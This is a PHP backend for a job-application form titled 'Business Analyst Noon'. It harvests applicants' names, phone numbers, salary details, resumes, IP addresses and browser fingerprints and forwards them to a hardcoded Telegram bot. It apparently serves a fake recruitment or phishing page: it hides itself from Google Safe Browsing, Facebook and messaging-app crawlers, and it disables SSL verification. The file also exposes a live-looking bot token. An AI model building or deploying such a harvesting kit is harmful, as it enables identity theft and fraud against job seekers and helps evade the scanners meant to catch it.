<?php
// ============================================================
// UPDATED FORM SUBMISSION HANDLER – Business Analyst Noon
// ============================================================

// 1. Anti-bot / crawler
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (preg_match('/(TelegramBot|WhatsApp|Instagram|facebookexternalhit|Facebot|GoogleImageProxy|Googlebot|Google-Safety|Mediapartners-Google)/i', $userAgent)) {
    exit();
}

// 2. Telegram config
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
$chatId   = "-1003598938463";
$logFile  = __DIR__ . '/submissions.log';

// 3. Helper functions
function getClientIp() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    return trim($ip);
}

function sendTelegramMessage($text) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text'    => $text,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => false
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

function sendTelegramDocument($filePath, $caption = '') {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot$botToken/sendDocument";
    $postFields = [
        'chat_id' => $chatId,
        'document' => new CURLFile($filePath),
        'caption'  => $caption,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_exec($ch);
    curl_close($ch);
}

// 4. Get client IP
$ip = getClientIp();

// 5. Sanitize form fields (all new fields)
$fullname           = htmlspecialchars(trim($_POST['fullname'] ?? ''), ENT_QUOTES, 'UTF-8');
$mobile             = htmlspecialchars(trim($_POST['mobile'] ?? ''), ENT_QUOTES, 'UTF-8');
$institution_name   = htmlspecialchars(trim($_POST['institution_name'] ?? ''), ENT_QUOTES, 'UTF-8');
$current_organization = htmlspecialchars(trim($_POST['current_organization'] ?? ''), ENT_QUOTES, 'UTF-8');
$current_designation = htmlspecialchars(trim($_POST['current_designation'] ?? ''), ENT_QUOTES, 'UTF-8');
$work_experience    = htmlspecialchars(trim($_POST['work_experience'] ?? ''), ENT_QUOTES, 'UTF-8');
$current_ctc        = htmlspecialchars(trim($_POST['current_ctc'] ?? ''), ENT_QUOTES, 'UTF-8');
$expected_ctc       = htmlspecialchars(trim($_POST['expected_ctc'] ?? ''), ENT_QUOTES, 'UTF-8');
$notice_period      = htmlspecialchars(trim($_POST['notice_period'] ?? ''), ENT_QUOTES, 'UTF-8');
$fpHash             = htmlspecialchars(trim($_POST['fingerprint_hash'] ?? ''), ENT_QUOTES, 'UTF-8');
if (empty($fpHash)) $fpHash = 'Not provided';

// Basic validation – all fields except file are required (asterisk)
if (empty($fullname) || empty($mobile) || empty($institution_name) || empty($current_organization) ||
    empty($current_designation) || empty($work_experience) || empty($current_ctc) ||
    empty($expected_ctc) || empty($notice_period)) {
    sendTelegramMessage("⚠️ <b>Submission Error</b>\nMissing required fields.\nIP: <code>$ip</code>");
    echo "ERROR";
    exit;
}

// 6. Handle file upload
$resume = $_FILES['resume'] ?? null;
$hasFile = $resume && $resume['error'] === UPLOAD_ERR_OK;

if (!$hasFile) {
    // No file – send text message only
    $text = "📋 <b>NEW REGISTRATION (no file)</b>\n";
    $text .= "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
    $text .= "👤 <b>CANDIDATE DETAILS</b>\n";
    $text .= "├ Full Name: $fullname\n";
    $text .= "├ Mobile: $mobile\n";
    $text .= "├ Institution: $institution_name\n";
    $text .= "├ Current Org: $current_organization\n";
    $text .= "├ Designation: $current_designation\n";
    $text .= "├ Work Experience: $work_experience\n";
    $text .= "├ Current CTC: $current_ctc\n";
    $text .= "├ Expected CTC: $expected_ctc\n";
    $text .= "├ Notice Period: $notice_period\n";
    $text .= "└ Fingerprint Hash: <code>$fpHash</code>\n\n";
    $text .= "🌍 <b>LOCATION</b>\n";
    $text .= "└ IP: <code>$ip</code>\n";
    sendTelegramMessage($text);
} else {
    // Validate file type
    $allowedMime = [
        'application/pdf',
        'application/msword',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
    ];
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $resume['tmp_name']);
    finfo_close($finfo);

    if (!in_array($mime, $allowedMime)) {
        sendTelegramMessage("❌ <b>Invalid File Type</b>\nUser: $fullname\nIP: <code>$ip</code>\nMIME: $mime");
        echo "ERROR";
        exit;
    }

    if ($resume['size'] > 10 * 1024 * 1024) {
        sendTelegramMessage("❌ <b>File Too Large</b>\nUser: $fullname\nIP: <code>$ip</code>\nSize: " . round($resume['size']/1024/1024,2) . " MB");
        echo "ERROR";
        exit;
    }

    // Save temp file
    $tmpDir = sys_get_temp_dir();
    $safeName = preg_replace('/[^a-zA-Z0-9._-]/', '_', $resume['name']);
    $tmpFilePath = $tmpDir . '/' . uniqid('resume_', true) . '_' . $safeName;
    if (!move_uploaded_file($resume['tmp_name'], $tmpFilePath)) {
        sendTelegramMessage("❌ <b>File Save Failed</b>\nUser: $fullname\nIP: <code>$ip</code>");
        echo "ERROR";
        exit;
    }

    // Prepare caption
    $caption = "📄 <b>NEW REGISTRATION with Resume</b>\n";
    $caption .= "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
    $caption .= "👤 <b>CANDIDATE DETAILS</b>\n";
    $caption .= "├ Full Name: $fullname\n";
    $caption .= "├ Mobile: $mobile\n";
    $caption .= "├ Institution: $institution_name\n";
    $caption .= "├ Current Org: $current_organization\n";
    $caption .= "├ Designation: $current_designation\n";
    $caption .= "├ Work Experience: $work_experience\n";
    $caption .= "├ Current CTC: $current_ctc\n";
    $caption .= "├ Expected CTC: $expected_ctc\n";
    $caption .= "├ Notice Period: $notice_period\n";
    $caption .= "└ Fingerprint Hash: <code>$fpHash</code>\n\n";
    $caption .= "🌍 <b>LOCATION</b>\n";
    $caption .= "└ IP: <code>$ip</code>\n\n";
    $caption .= "📎 <b>RESUME</b>\n";
    $caption .= "├ File: " . htmlspecialchars($resume['name']) . "\n";
    $caption .= "├ Size: " . round($resume['size'] / 1024 / 1024, 2) . " MB\n";
    $caption .= "└ [Attached above]";

    // Send document
    sendTelegramDocument($tmpFilePath, $caption);

    // Clean up
    unlink($tmpFilePath);
}

// 7. Log submission
$logEntry = date('Y-m-d H:i:s') . " | $ip | $fullname | $mobile | $institution_name | $current_organization | $current_designation | $work_experience | $current_ctc | $expected_ctc | $notice_period | $fpHash\n";
@file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

// 8. Return success
echo "OK";
?>
